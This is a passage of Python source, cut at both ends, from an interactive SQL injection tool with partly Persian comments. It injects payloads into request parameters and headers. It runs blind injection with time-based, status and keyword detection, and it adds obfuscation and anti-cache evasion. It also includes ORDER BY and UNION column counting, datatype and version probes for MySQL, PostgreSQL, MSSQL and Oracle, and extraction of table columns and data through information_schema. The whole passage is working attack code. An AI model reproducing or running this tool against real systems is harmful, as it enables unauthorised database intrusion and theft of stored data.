                    (self.encode_headers == "auto" and looks_encoded(orig))
                )
                payload_piece = quote(p_ctx, safe="") if use_encode else p_ctx
                val = (orig + payload_piece) if (getattr(self, "injection_mode", "append") == "append") else payload_piece
                headers[key] = val
                return {"url": self.url, "method": "GET", "headers": headers}

        except Exception as e:
            print(f"[-] build error for {pt}:{key}: {e}")
            return None

    def prepare_injection(self, payload):
        if not self.prepared_data or not self.selected_keys:
            print("[-] Nothing prepared. Run collect_inputs() first.")
            return None
        pt = self.prepared_data["type"]

        if isinstance(payload, dict):
            out = {}
            for label, p in payload.items():
                sub = {}
                for k in self.selected_keys:
                    req = self._build_one(k, p)
                    if req:
                        sub[f"{pt}:{k}:{label}"] = req
                if sub:
                    out[label] = sub
            return out if out else None

        out = {}
        for k in self.selected_keys:
            req = self._build_one(k, payload)
            if req:
                out[f"{pt}:{k}"] = req
        return out if out else None

    # -------- sender helper --------
    def send(self, req, quiet: bool = False, tries_override: int = None):  # NEW param
        # Retry + backoff 
        transient = {429, 502, 503, 504}
        tries = tries_override if tries_override is not None else 3  # NEW
        backoff = 0.6
        last_err = None
        for attempt in range(1, tries + 1):
            try:
                if req["method"].upper() == "GET":
                    r = self.session.get(
                        req["url"], headers=req.get("headers"),
                        cookies=req.get("cookies"), timeout=self.timeout
                    )
                else:
                    r = self.session.post(
                        req["url"], data=req.get("data"),
                        headers=req.get("headers"), cookies=req.get("cookies"),
                        timeout=self.timeout
                    )
                if r.status_code in transient and attempt < tries:
                    time.sleep(backoff * attempt)
                    continue
                return r
            except Exception as e:
                last_err = e
                if attempt < tries:
                    time.sleep(backoff * attempt)
                    continue
                if not quiet:
                    print(f"[-] Send failed (final): {e} | {req.get('method')} {req.get('url')}")
                return None


# ------------------- Playwright helpers -------------------
def open_in_browser(req):
    if not PW_AVAILABLE:
        print("[-] Playwright not available. Install with: pip install playwright && playwright install")
        return

    def cookie_list_from_req(url, cookies_dict):
        if not cookies_dict:
            return []
        domain = urlparse(url).hostname or ""
        return [{"name": k, "value": v, "domain": domain, "path": "/"} for k, v in cookies_dict.items()]

    p = sync_playwright().start()
    browser = None
    context = None
    try:
        browser = p.chromium.launch(headless=False)
        context_kwargs = {}
        if req.get("headers"):
            context_kwargs["extra_http_headers"] = req["headers"]
        context = browser.new_context(**context_kwargs)

        if req.get("cookies"):
            cookies = cookie_list_from_req(req["url"], req["cookies"])
            if cookies:
                try:
                    context.add_cookies(cookies)
                except Exception as e:
                    print(f"[!] Could not add cookies to browser: {e}")

        page = context.new_page()
        try:
            if req["method"].upper() == "GET":
                page.goto(req["url"], timeout=30000)
            else:
                resp = page.request.post(req["url"], data=req.get("data") or {})
                txt = resp.text()
                status = resp.status
                page.set_content(f"<pre>Status: {status}\n\n{escape_html(txt)}</pre>")
        except Exception as e:
            page.set_content(f"<pre>Navigation error:\n{escape_html(str(e))}</pre>")

        input("\nPress Enter to close it : ")

    finally:
        try:
            if context:
                context.close()
        except Exception:
            pass
        try:
            if browser:
                browser.close()
        except Exception:
            pass
        try:
            p.stop()
        except Exception:
            pass



# ------------------- Folder loader (payload/error dicts) -------------------
def discover_py_files(folder: str):
    out = []
    for root, dirs, files in os.walk(folder):
        for f in files:
            if f.endswith(".py"):
                out.append(os.path.join(root, f))
    return out

def load_module_from_path(path: str):
    name = f"dynmod_{abs(hash(path))}"
    spec = importlib.util.spec_from_file_location(name, path)
    if spec is None or spec.loader is None:
        return None
    mod = importlib.util.module_from_spec(spec)
    try:
        spec.loader.exec_module(mod)
        return mod
    except Exception as e:
        print(f"[-] Failed to load {path}: {e}")
        return None

def collect_top_level_dicts(mod):
    result = {}
    for k, v in vars(mod).items():
        if k.startswith("_"):
            continue
        if isinstance(v, dict):
            result[k] = v
    return result

def choose_from_list(title, items):
    print(f"\n{title}")
    for i, it in enumerate(items, start=1):
        print(f"{i}. {it}")
    print("9. Back   |   0. Cancel")
    sel = input("> ").strip()
    if sel in ("9", "۹"): return "back"
    if sel in ("0", "۰"): return None
    try:
        idx = to_int_safe(sel, 1, len(items)) - 1
    except Exception:
        print("[-] Invalid selection.")
        return None
    return items[idx]

def flatten_payload_dict(payload_dict):
    flat = {}
    for key, val in payload_dict.items():
        if isinstance(val, list):
            for i, v in enumerate(val):
                flat[f"{key}[{i}]"] = str(v)
        else:
            flat[str(key)] = str(val)
    return flat

def compile_error_patterns(err_dict):
    comp = {}
    for engine, patterns in err_dict.items():
        c = []
        for p in patterns:
            try:
                c.append(re.compile(p, re.IGNORECASE | re.DOTALL))
            except re.error as e:
                print(f"[!] Invalid regex for {engine}: {p} ({e})")
        if c:
            comp[engine] = c
    return comp

def scan_errors(text: str, compiled_errs):
    hits = []
    for engine, regs in compiled_errs.items():
        for r in regs:
            m = r.search(text or "")
            if m:
                hits.append({"engine": engine, "pattern": r.pattern})
    return hits


# ------------------- Blind runner (enhanced reporting) -------------------
def run_blind_user_payload(ic, obfuscator):
    
    if not ic or not ic.prepared_data or not ic.selected_keys:
        print("[-] No inputs selected. Use option 2 first.")
        return

    # --- گرفتن payload ها ---
    mode = input("Payload input mode: 1) single template  2) dict (label:payload)  >>> ").strip()
    payload_map = {}
    if mode == "1":
        tpl = input("Enter payload template (supports {placeholders}): ").strip()
        if not tpl:
            print("[-] Empty template.")
            return
        payload_map = {"p0": tpl}
    elif mode == "2":
        print("Enter dict payloads (label:payload), one per line. Empty line to end.")
        while True:
            line = input()
            if not line.strip(): break
            if ":" not in line:
                print("Use format label:payload")
                continue
            label, p = line.split(":", 1)
            payload_map[label.strip()] = p.strip()
        if not payload_map:
            print("[-] No payloads.")
            return
        payload_map = select_labels_by_number(payload_map)
    else:
        print("[-] Invalid mode.")
        return

    apply_obf = input("Apply obfuscation to blind payloads? (y/n): ").strip().lower()
    if apply_obf in ("y", "yes", "1", "۱"):
        for label in list(payload_map.keys()):
            payload_map[label], applied_tech = obfuscator.obfuscate(payload_map[label])
            print(f"[*] Obfuscated {label}: {payload_map[label]}")
            print(f"[*] Techniques applied: {', '.join(applied_tech)}")

    # جمع placeholder ها
    vars_all = []
    for s in payload_map.values():
        for v in find_placeholders_in_string(s):
            if v not in vars_all:
                vars_all.append(v)

    # --- Detection mode ---
    print("\nDetection mode:")
    print("1) Body tester word (presence/absence)")
    print("2) HTTP status equals (e.g., 500)")
    print("3) HTTP status not equals (e.g., 200)")
    print("4) Response time >= threshold (time-based blind)")
    det_sel = input(">>> ").strip()

    # defaults
    det_mode = None
    tester = ""
    tmode = "success"
    status_target = None

    # throttle defaults (will be overridden if time-based)
    throttle_every = 8
    throttle_short = 0.08
    throttle_long = 0.35

    # time-based vars — initialized here so they're always defined
    time_threshold = None
    time_repeats = 1
    expected_delay = None
    time_false_threshold = None
    early_stop = True
    anti_cache_mode = "auto"

    if det_sel in ("1","۱"):
        det_mode = "tester"
        tester = input("Tester word (leave blank to skip): ").strip()
        if tester:
            ttype = input("Tester type: 1) error (absence=True)  2) success (presence=True)  >>> ").strip()
            tmode = "error" if ttype in ("1","۱") else "success"

    elif det_sel in ("2","۲"):
        det_mode = "status_eq"
        try:
            status_target = int(input("Status code to consider TRUE (e.g., 500): ").strip() or "500")
        except:
            status_target = 500

    elif det_sel in ("3","۳"):
        det_mode = "status_neq"
        try:
            status_target = int(input("Status code to consider FALSE (e.g., 200) — anything else TRUE: ").strip() or "200")
        except:
            status_target = 200

    elif det_sel in ("4","۴"):
        det_mode = "time" 
        try:
            time_repeats = int(input("Repeat up to N times if needed? (default 2): ").strip() or "2")
            if time_repeats < 1: time_repeats = 1
        except:
            time_repeats = 2

        try:
            time_threshold = float(input("Consider TRUE if response time ≥ (seconds): ").strip() or "1.5")
        except:
            time_threshold = 1.5

        raw_false_thr = input("Consider FALSE if response time ≤ (seconds, optional): ").strip()
        try:
            time_false_threshold = float(raw_false_thr) if raw_false_thr else None
        except:
            time_false_threshold = None

        early_stop_in = (input("Stop early when TRUE detected? (y/n) [y]: ").strip().lower() or "y")
        early_stop = early_stop_in in {"y","yes","1","۱","ب","غ"}

        throttle_every = 999999
        throttle_short = 0.0
        throttle_long = 0.0

        print("\nAnti-cache mode:")
        print("1) both (headers + query param)")
        print("2) param-only")
        print("3) headers-only")
        print("4) off")
        print("5) auto-fallback (try both; on 400/403/405 retry param-only) [default]")
        ac_sel = (input(">>> ").strip() or "5")
        if ac_sel == "1":
            anti_cache_mode = "both"
        elif ac_sel == "2":
            anti_cache_mode = "param"
        elif ac_sel == "3":
            anti_cache_mode = "headers"
        elif ac_sel == "4":
            anti_cache_mode = "off"
        else:
            anti_cache_mode = "auto"




    else:
        det_mode = "none"


    # throttle 
    global_counter = 0

    # --- برای نمایش لحظه‌ای ---
    found_combos = []        
    found_combo_keys = set() 
    per_var_values = {}      # map: var -> [unique values in order]
    for v in vars_all:
        per_var_values[v] = ""

    def _add_found(values_now: dict) -> bool:
        
        if not values_now:
            key = ("__no_placeholders__",)
        else:
            key = tuple((k, str(values_now[k])) for k in vars_all)
        if key in found_combo_keys:
            return False
        found_combo_keys.add(key)
        found_combos.append({k: str(values_now.get(k, "")) for k in vars_all})
        for v in vars_all:
            if v in values_now:
                val = str(values_now[v])
                per_var_values[v] += val
        return True

    def _print_progress():
        
        last = found_combos[-1] if found_combos else {}
        if last:
            last_items = [f"{k}='{last[k]}'" for k in vars_all]
            print(f"\n[FOUND #{len(found_combos)}] " + ", ".join(last_items))
        else:
            print(f"\n[FOUND #{len(found_combos)}] (no placeholders)")
        # لیست  placeholder
        for v in vars_all:
            print(f"  {v}: {per_var_values[v]}")
        print("")  

    def _apply_anti_cache(req_local, i, mode):
        # mode: "both" | "param" | "headers" | "off"
        if mode in ("both", "headers"):
            hdrs = dict(req_local.get("headers") or {})
            hdrs["Cache-Control"] = "no-store, no-cache, max-age=0"
            hdrs["Pragma"] = "no-cache"
            hdrs["X-Req-Nonce"] = f"{time.time():.6f}-{i}"
            req_local["headers"] = hdrs

        if mode in ("both", "param"):
            if (req_local.get("method", "GET").upper() == "GET") and req_local.get("url"):
                pu = urlparse(req_local["url"])
                q = dict(parse_qsl(pu.query, keep_blank_values=True))
                q["_t"] = f"{time.time():.6f}-{i}"
                req_local["url"] = urlunparse(pu._replace(query=urlencode(q)))
        return req_local

    # NEW: measure elapsed time (median over repeats), with tries_override=1 to avoid backoff impact
    def _send_and_time(ic, req, repeats: int = 1, anti_cache_mode: str = "auto"):
        """
        anti_cache_mode:
        - "both"    : هدر + پارامتر
        - "param"   : فقط پارامتر _t
        - "headers" : فقط هدرهای ضدکش
        - "off"     : بدون ضدکش
        - "auto"    : ابتدا both؛ اگر 400/403/405 دید، همان نوبت را با param-only تکرار می‌کند
        """
        times = []
        r_last = None

        for i in range(max(1, repeats)):
            req_local = dict(req)

            def send_once(local_req):
                t0 = perf_counter()
                r = ic.send(local_req, quiet=True, tries_override=1)
                dt = perf_counter() - t0
                return r, dt

            if anti_cache_mode == "off":
                r, dt = send_once(req_local)

            elif anti_cache_mode == "param":
                r, dt = send_once(_apply_anti_cache(dict(req_local), i, "param"))

            elif anti_cache_mode == "headers":
                r, dt = send_once(_apply_anti_cache(dict(req_local), i, "headers"))

            elif anti_cache_mode == "both":
                r, dt = send_once(_apply_anti_cache(dict(req_local), i, "both"))

            else:  # auto
                r, dt = send_once(_apply_anti_cache(dict(req_local), i, "both"))
                if r is not None and r.status_code in (400, 403, 405):
                    r, dt = send_once(_apply_anti_cache(dict(req_local), i, "param"))

            times.append(dt)
            r_last = r

        times_sorted = sorted(times)
        dt_med = times_sorted[len(times_sorted)//2]
        return r_last, times, dt_med


    def _send_time_stepwise(ic, req, repeats: int, anti_cache_mode: str,thr_true: float, thr_false: float | None, early_stop: bool):
        times = []
        labels = []  # per-try: True / False / None
        r_last = None
        used = 0
        matched_any = False  # OR across tries

        def _send_once(local_req, i):
            def send_once(lreq):
                t0 = perf_counter()
                r = ic.send(lreq, quiet=True, tries_override=1)
                dt = perf_counter() - t0
                return r, dt

            if anti_cache_mode == "off":
                return send_once(local_req)
            elif anti_cache_mode == "param":
                return send_once(_apply_anti_cache(dict(local_req), i, "param"))
            elif anti_cache_mode == "headers":
                return send_once(_apply_anti_cache(dict(local_req), i, "headers"))
            elif anti_cache_mode == "both":
                return send_once(_apply_anti_cache(dict(local_req), i, "both"))
            else:
                r, dt = send_once(_apply_anti_cache(dict(local_req), i, "both"))
                if r is not None and r.status_code in (400, 403, 405):
                    r, dt = send_once(_apply_anti_cache(dict(local_req), i, "param"))
                return r, dt

        for i in range(repeats):
            req_local = dict(req)
            r, dt = _send_once(req_local, i)
            r_last = r
            times.append(dt)
            used += 1

            lbl = None
            if dt >= thr_true:
                lbl = True
                matched_any = True
            elif (thr_false is not None) and (dt <= thr_false):
                lbl = False
            labels.append(lbl)

            if early_stop and lbl is True:  # y ⇒ findfirst/OR
                break

        # y ⇒ OR (هر True کافی‌ست) | n ⇒ AND (همه باید True باشند)
        if early_stop:
            final_match = matched_any
        else:
            final_match = (len(labels) == repeats and all(x is True for x in labels))

        return r_last, times, final_match, used, labels





    def _judge(r, dt=None):
        if r is None:
            return None, False
        body = r.text or ""
        if det_mode == "status_eq":
            ok = (r.status_code == status_target)
        elif det_mode == "status_neq":
            ok = (r.status_code != status_target)
        elif det_mode == "tester":
            ok = eval_by_tester_mode(body, tester, tmode) if tester else False
        elif det_mode == "time":
            ok = (dt is not None and time_threshold is not None and dt >= time_threshold)
        else:
            ok = False
        return r.status_code, ok


    # بدون placeholder
    if not vars_all:
        counter = 0
        any_ok_time = False
        for label, tpl in payload_map.items():
            built = ic.prepare_injection(tpl)
            if not built:
                print(f"[-] Prepare failed for {label}")
                continue
            for rk, req in built.items():
                counter += 1
                if det_mode == "time":
                    r, times, matched, used, labels = _send_time_stepwise(ic, req, time_repeats, anti_cache_mode, time_threshold, time_false_threshold, early_stop)
                    if r is None:
                        continue
                    if used == 1:
                        print(f"[{counter}] {label} @ {rk} | status={r.status_code} | time={times[0]:.3f}s | match? {matched}")
                    else:
                        for idx_try, t in enumerate(times, 1):
                            lab = labels[idx_try-1]
                            tag = "TRUE" if lab is True else ("FALSE" if lab is False else "…")
                            print(f"[{counter}.{idx_try}] {label} @ {rk} | status={r.status_code} | time={t:.3f}s | {tag}")
                        print(f"[{counter}] {label} @ {rk} | final_match={matched} (n={used})")
                else:
                    r = ic.send(req, quiet=True)
                    time.sleep(throttle_short); global_counter += 1
                    if global_counter % throttle_every == 0: time.sleep(throttle_long)
                    status, ok = _judge(r)
                    if status is None:
                        continue
                    print(f"[{counter}] {label} @ {rk} | status={status} | match? {ok}")
                    if ok:
                        if _add_found({}):
                            _print_progress()

        return



    # --- if placeholder : outer exhaustive + findfirst ---
    plan, _ = prompt_placeholder_plan(vars_all)

    
    ranges = {}
    multi_vars = []
    for v, cfg in plan.items():
        vals = cfg["values"]; start = cfg["start"]
        if len(vals) > 1:
            ranges[v] = list(range(start, len(vals)))
            multi_vars.append(v)
        else:
            ranges[v] = [0]

    outer_var = multi_vars[0] if multi_vars else vars_all[0]

    def iter_product_except_outer(current_ranges, fixed_outer_idx):
        order = [v for v in vars_all if v != outer_var]
        lists = [current_ranges[v] for v in order]
        for combo in itertools.product(*lists):
            m = {outer_var: fixed_outer_idx}
            m.update(dict(zip(order, combo)))
            yield m

    test_counter = 0

    for outer_idx in ranges[outer_var]:
        found_map = {v: None for v in vars_all if plan[v]["strategy"] == "findfirst" and v != outer_var}
        inner_ranges = ranges.copy()
        progressed = True

        while progressed:
            progressed = False
            for idx_map in iter_product_except_outer(inner_ranges, outer_idx):
                skip = False
                for v in found_map:
                    if found_map[v] is not None and idx_map[v] != found_map[v]:
                        skip = True; break
                if skip: continue

                values_now = {v: plan[v]["values"][idx_map[v]] for v in vars_all}
                idx_parts = [f"{v}#{idx_map[v]+1}='{values_now[v]}'" for v in vars_all]
                idx_str = ", ".join(idx_parts)

                any_ok = False
                any_ok_time = False
                for label, tpl in payload_map.items():
                    filled = tpl
                    for k, val in values_now.items():
                        filled = filled.replace("{"+k+"}", str(val))

                    built_group = ic.prepare_injection(filled)
                    if not built_group:
                        continue

                    for rk, req in built_group.items():
                        test_counter += 1
                        if det_mode == "time":
                            r, times, matched, used, labels = _send_time_stepwise(
                                ic, req, time_repeats, anti_cache_mode, time_threshold, time_false_threshold, early_stop
                            )
                            if r is None:
                                continue
                            if used == 1:
                                print(f"[{test_counter}] {label} @ {rk} | idxs=[{idx_str}] | status={r.status_code} | time={times[0]:.3f}s | match? {matched}")

                            else:
                                for idx_try, t in enumerate(times, 1):
                                    lab = labels[idx_try-1]
                                    tag = "TRUE" if lab is True else ("FALSE" if lab is False else "…")
                                    print(f"[{test_counter}.{idx_try}] {label} @ {rk} | idxs=[{idx_str}] | status={r.status_code} | time={t:.3f}s | {tag}")
                                print(f"[{test_counter}] {label} @ {rk} | idxs=[{idx_str}] | final_match={matched} (n={used})")
                            if matched:
                                any_ok_time = any_ok_time or matched
                                if _add_found(values_now):
                                    _print_progress()
                        else:
                            r = ic.send(req, quiet=True)
                            time.sleep(throttle_short); global_counter += 1
                            if global_counter % throttle_every == 0: time.sleep(throttle_long)
                            status, ok = _judge(r)
                            if status is None:
                                continue
                            any_ok = any_ok or ok
                            print(f"[{test_counter}] {label} @ {rk} | idxs=[{idx_str}] | status={status} | match? {ok}")
                            if ok:
                                if _add_found(values_now):
                                    _print_progress()

                if (det_mode != "time" and any_ok) or (det_mode == "time" and any_ok_time):
                    for v, cfg in plan.items():
                        if v != outer_var and cfg["strategy"] == "findfirst" and found_map.get(v) is None:
                            found_map[v] = idx_map[v]
                            inner_ranges[v] = [idx_map[v]]
                            progressed = True
                    break



    print("\n[Done] Blind tests finished.")


# ------------------- Helpers (ORDER/UNION etc.) -------------------
def run_column_counter(ic):
    if not ic or not ic.prepared_data or not ic.selected_keys:
        print("[-] No inputs selected. Use option 2 first.")
        return

    try:
        max_c = int(input("Max columns to try (e.g., 12): ").strip() or "12")
        max_c = max(1, min(max_c, 64))
    except:
        max_c = 12

    comment_styles = ["-- ", "#"]
    with_quotes = [True, False]

    def _send_payload(p):
        built = ic.prepare_injection(p)
        if not built: return []
        rows = []
        for lbl, req in built.items():
            r, dt = timed_send(ic, req, quiet=True)
            if r is None:
                rows.append((lbl, None, None, None, None))
                continue
            body = r.text or ""
            rows.append((lbl, r.status_code, len(body), _short_hash(body), dt))
        return rows


    print("\n[ORDER BY scan]")
    for com in comment_styles:
        for q in with_quotes:
            print(f"\n== Using comment=[{com.strip()}], quotes={'yes' if q else 'no'} ==")
            for i in range(1, max_c+1):
                payload = (f"' ORDER BY {i}{com}" if q else f" ORDER BY {i}{com}")
                rows = _send_payload(payload)
                if not rows:
                    print(f"[i={i}] send failed.")
                    continue
                sample = rows[0]
                if sample[1] is None:
                    print(f"[i={i}] -> send failed")
                    continue
                print(f"[i={i}] -> status={sample[1]} len={sample[2]} hash={sample[3]} time={sample[4]:.3f}s")

    print("\n[UNION NULL scan]")
    for com in comment_styles:
        for q in with_quotes:
            print(f"\n== Using comment=[{com.strip()}], quotes={'yes' if q else 'no'} ==")
            for i in range(1, max_c+1):
                nulls = ",".join(["NULL"]*i)
                payload = (f"' UNION SELECT {nulls}{com}" if q else f" UNION SELECT {nulls}{com}")
                rows = _send_payload(payload)
                if not rows:
                    print(f"[cols={i}] send failed.")
                    continue
                sample = rows[0]
                if sample[1] is None:
                    print(f"[cols={i}] -> send failed")
                    continue
                print(f"[cols={i}] -> status={sample[1]} len={sample[2]} hash={sample[3]} time={sample[4]:.3f}s")

def run_datatype_tester(ic):
    if not ic or not ic.prepared_data or not ic.selected_keys:
        print("[-] No inputs selected. Use option 2 first.")
        return

    try:
        col_count = int(input("Number of columns in UNION: ").strip())
        col_count = max(1, min(col_count, 32))
    except:
        print("[-] Invalid number.")
        return

    qneed = input("Does value need quotes? 1(yes)/0(no): ").strip()
    with_quotes = (qneed in ("1", "۱", "yes", "y"))

    tests = {
        "string": "'dmDyCT'",
        "int": "123",
        "float": "3.14",
        "bool": "TRUE",
        "time": "2024-01-01",
        "null": "NULL"
    }
    comment_styles = ["-- ", "#"]

    def _send_payload(p):
        built = ic.prepare_injection(p)
        if not built: return []
        rows = []
        for lbl, req in built.items():
            r, dt = timed_send(ic, req, quiet=True)
            if r is None:
                rows.append((lbl, None, None, None, None))
                continue
            body = r.text or ""
            rows.append((lbl, r.status_code, len(body), _short_hash(body), dt))
        return rows


    for com in comment_styles:
        for dtype, val in tests.items():
            print(f"\n== dtype={dtype}  comment={com.strip()} ==")
            for i in range(col_count):
                cols = ["NULL"] * col_count
                cols[i] = val
                pay = f"UNION SELECT {','.join(cols)}{com}"
                if with_quotes:
                    pay = "'" + " " + pay
                rows = _send_payload(pay)
                if not rows:
                    print(f"[col {i+1}] send failed.")
                    continue
                sample = rows[0]
                if sample[1] is None:
                    print(f"[col {i+1}] send failed.")
                    continue
                print(f"[col {i+1}] status={sample[1]} len={sample[2]} hash={sample[3]} time={sample[4]:.3f}s")

def run_version_probe(ic):
    if not ic or not ic.prepared_data or not ic.selected_keys:
        print("[-] No inputs selected. Use option 2 first.")
        return

    try:
        col_count = int(input("Number of columns in UNION: ").strip())
        col_count = max(1, min(col_count, 32))
    except:
        print("[-] Invalid number.")
        return

    qneed = input("Does value need quotes? 1(yes)/0(no): ").strip()
    with_quotes = (qneed in ("1", "۱", "yes", "y"))

    versions = {
        "MySQL/MSSQL": "@@version",
        "PostgreSQL": "version()",
        "Oracle(v$version)": "banner FROM v$version",
        "Oracle(v$instance)": "version FROM v$instance"
    }

    try:
        target_col = int(input(f"Which column (1–{col_count}) holds the version expr? ").strip())
        assert 1 <= target_col <= col_count
    except:
        print("[-] Invalid column index.")
        return

    def _send_payload(p):
        built = ic.prepare_injection(p)
        if not built: return []
        rows = []
        for lbl, req in built.items():
            r, dt = timed_send(ic, req, quiet=True)
            if r is None:
                rows.append((lbl, None, None, None, None))
                continue
            body = r.text or ""
            rows.append((lbl, r.status_code, len(body), _short_hash(body), dt))
        return rows


    comment_styles = ["-- ", "#"]
    for com in comment_styles:
        for engine, expr in versions.items():
            cols = ["NULL"] * col_count
            cols[target_col-1] = expr
            pay_core = f"SELECT {','.join(cols)}"
            pay = f"UNION {pay_core}{com}"
            if with_quotes:
                pay = "'" + " " + pay
            rows = _send_payload(pay)
            print(f"\n[{engine}] {pay}")
            if not rows:
                print(" send failed.")
                continue
            sample = rows[0]
            if sample[1] is None:
                print(" send failed.")
                continue
            print(f" status={sample[1]} len={sample[2]} hash={sample[3]} time={sample[4]:.3f}s")

def run_db_info_interactive(ic):
    if not ic or not ic.prepared_data or not ic.selected_keys:
        print("[-] No inputs selected. Use option 2 first.")
        return

    try:
        col_count = int(input("Number of columns in UNION: ").strip())
        col_count = max(1, min(col_count, 32))
    except:
        print("[-] Invalid number.")
        return

    qneed = input("Does the payload need quotes? 1(yes)/0(no): ").strip()
    with_quotes = (qneed in ("1", "۱", "yes", "y"))

    mode = input("1: Custom payload  |  2: List columns of a table  |  3: Extract data from a table\n>>> ").strip()
    cols = ["NULL"] * col_count
    from_clause = ""
    where_clause = ""

    if mode == "2":
        table = input("Table name: ").strip()
        while True:
            try:
                idx = int(input(f"Column index (1–{col_count}) for column_name: ").strip())
                if 1 <= idx <= col_count: break
            except: pass
        cols[idx-1] = "column_name"
        from_clause = " FROM information_schema.columns"
        where_clause = f" WHERE table_name='{table}'"

    elif mode == "3":
        table = input("Table name: ").strip()
        for i in range(col_count):
            v = input(f"Column {i+1} name (leave empty for NULL): ").strip()
            if v: cols[i] = v
        from_clause = f" FROM {table}"

    elif mode == "1":
        try:
            n = int(input("How many columns to fill? ").strip())
            assert 1 <= n <= col_count
        except:
            print("[-] Invalid number.")
            return
        for _ in range(n):
            while True:
                try:
                    idx = int(input(f"Target column index (1–{col_count}): ").strip())
                    if 1 <= idx <= col_count: break
                except: pass
            v = input(f"Value/expression for column {idx} (e.g., column_name, version(), 'abc'): ")
            cols[idx-1] = v

        add_from = input("Add FROM clause? (y/n): ").strip().lower()
        if add_from == "y":
            from_clause = " FROM " + input("Table/view name: ").strip()
    else:
        print("[-] Invalid mode.")
        return

    core = f"SELECT {','.join(cols)}{from_clause}{where_clause}"
    payload = f"UNION {core}-- "
    if with_quotes:
        payload = "'" + " " + payload

    built = ic.prepare_injection(payload)
    if not built:
        print("[-] Prepare failed.")
        return

    print(f"\nPayload: {payload}\n")
    for lbl, req in built.items():
        r, dt = timed_send(ic, req, quiet=True)
        if r is None:
            print(f"{lbl} -> send failed")
            continue
        print(f"{lbl}: status={r.status_code} len={len(r.text)} hash={_short_hash(r.text)} time={dt:.3f}s")



# ------------------- Browser selection helper -------------------
def prompt_open_results_in_browser(last_prepared: dict):
    if not PW_AVAILABLE:
        print("[*] Playwright not installed; skipping browser open.")
        return
    if not last_prepared:
        print("[*] Nothing to open.")
        return

    keys = list(last_prepared.keys())

    while True:
        print("\nOpen which results in browser?")
        for i, k in enumerate(keys, start=1):
            print(f"{i}. {k}")
        print("Enter indices (e.g., 1,3-5 or 'all') or 0 to stop.")
        sel = input("> ").strip()
        if sel in ("0", "۰", ""):
            return

        try:
            indices = parse_multi_indices(sel, len(keys))
        except Exception:
            print("[-] Invalid selection.")
            continue
        if not indices:
            print("[-] Nothing selected.")
            continue

        for i in indices:
            label = keys[i-1]
            print(f"\n[Playwright] Opening: {label}")
            open_in_browser(last_prepared[label])

        while True:
            cont = input("Open more? (y/n): ").strip().lower()
            yes_set = {"y", "yes", "1", "۱", "ب", "غ"}
            no_set  = {"n", "no", "0", "۰", "ن", "د"}
            if cont in yes_set:
                break
            if cont in no_set or cont == "":
                return
            print("Please answer y/n .")





# ======== Column Count (Advanced) helpers ========

DBMS_PROFILES = {
    "MySQL": {
        "version_expr": "@@version",
        "time_func": "SLEEP({sec})",
        "cast_str": "CAST('x' AS CHAR)",
        "cast_int": "CAST(NULL AS SIGNED)",
        "needs_dual": False,
        "comment_styles": ["-- ", "#", "/*"]
    },
    "PostgreSQL": {
        "version_expr": "version()",
        "time_func": "pg_sleep({sec})",
        "cast_str": "CAST('x' AS TEXT)",
        "cast_int": "CAST(NULL AS INTEGER)",
        "needs_dual": False,
        "comment_styles": ["-- ", "/*"]
    },
    "MSSQL": {
        "version_expr": "@@version",
        "time_func": "WAITFOR DELAY '0:0:{sec}'",
        "cast_str": "CAST('x' AS NVARCHAR(100))",
        "cast_int": "CAST(NULL AS INT)",
        "needs_dual": False,
        "comment_styles": ["-- ", "/*"]
    },
    "Oracle": {
        "version_expr": "banner FROM v$version",
        "time_func": "dbms_lock.sleep({sec})",
        "cast_str": "CAST('x' AS VARCHAR2(100))",
        "cast_int": "CAST(NULL AS NUMBER)",
        "needs_dual": True,
        "comment_styles": ["-- ", "/*"]
    }
}

TRAILING_COMMENTS = ["-- ", "--+", "#", "/*"]

def _mk_null_list(n: int) -> str:
    return ",".join(["NULL"] * n)

def _mk_cast_mix(n: int, cast_str: str, cast_int: str) -> str:
    cols = []
    for i in range(n):
        cols.append(cast_str if i % 2 == 0 else cast_int)
    return ",".join(cols)

def _apply_quotes(payload: str, need_quotes: bool) -> str:
    return ("' " + payload) if need_quotes else (" " + payload)

def _stacked_time_payload_mssql(sec_int: int, need_quotes: bool, comment_style: str) -> str:
    # Builds stacked query:  ' ; WAITFOR DELAY '0:0:5'-- 
    core = f"; WAITFOR DELAY '0:0:{sec_int}'"
    if need_quotes:
        pay = "' " + core
    else:
        pay = " " + core
    if comment_style == "/*":
        pay += "/*+*/"
    else:
        pay += comment_style
    return pay


def _append_comment(payload: str, comment_style: str, dbms: str) -> str:
    if comment_style == "/*":
        # safer: open+close to avoid parser quirks
        return payload + "/*+*/"
    return payload + comment_style


def _send_and_measure(ic, req_builder, label: str, payload: str):
    prepared = req_builder(payload)
    if not prepared:
        return []
    rows = []
    for rk, req in prepared.items():
        t0 = perf_counter()
        r = ic.send(req)
        t1 = perf_counter()
        if r is None:
            rows.append((label, rk, None, None, None, t1 - t0, "send-failed"))
        else:
            body = r.text or ""
            rows.append((label, rk, r.status_code, len(body), _short_hash(body), t1 - t0, "ok"))
    return rows

def _print_rows(rows):
    for (label, rk, st, ln, hh, dt, note) in rows:
        print(f"{label} @ {rk}\n  -> status={st} len={ln} hash={hh} time={dt:.3f}s note={note}")


def run_column_counter_advanced(ic):
    if not ic or not ic.prepared_data or not ic.selected_keys:
        print("[-] No inputs selected. Use option 2 first.")
        return

    try:
        max_c = int(input("Max columns to try (default 12): ").strip() or "12")
        max_c = max(1, min(max_c, 64))
    except:
        max_c = 12

    qneed_in = input("Does target need a breaking quote? 1(yes)/0(no) [default 1]: ").strip()
    need_quotes = (qneed_in in ("", "1", "۱", "y", "yes"))

    print("\nWhich DBMS profiles to test? (comma-separated or 'all'):")
    dbms_names = list(DBMS_PROFILES.keys())
    for i, name in enumerate(dbms_names, 1):
        print(f"  {i}. {name}")
    sel = input("> ").strip().lower()
    chosen = []
    if sel in ("", "all", "a", "*"):
        chosen = dbms_names
    else:
        try:
            idxs = parse_multi_indices(sel, len(dbms_names))
            for i in idxs:
                chosen.append(dbms_names[i-1])
        except:
            chosen = dbms_names

    use_comment_styles = []
    print("\nUse trailing comments (global)? default=all [-- , --+, #, /*]")
    inp = input("Enter like '1,3' by order or leave empty for all: ").strip()
    if not inp:
        use_comment_styles = TRAILING_COMMENTS[:]
    else:
        try:
            idxs = parse_multi_indices(inp, len(TRAILING_COMMENTS))
            for i in idxs:
                use_comment_styles.append(TRAILING_COMMENTS[i-1])
        except:
            use_comment_styles = TRAILING_COMMENTS[:]

    tb_in = input("\nEnable time-based probe per DBMS? 1(yes)/0(no) [default 1]: ").strip()
    enable_time = (tb_in in ("", "1", "۱", "y", "yes"))
    try:
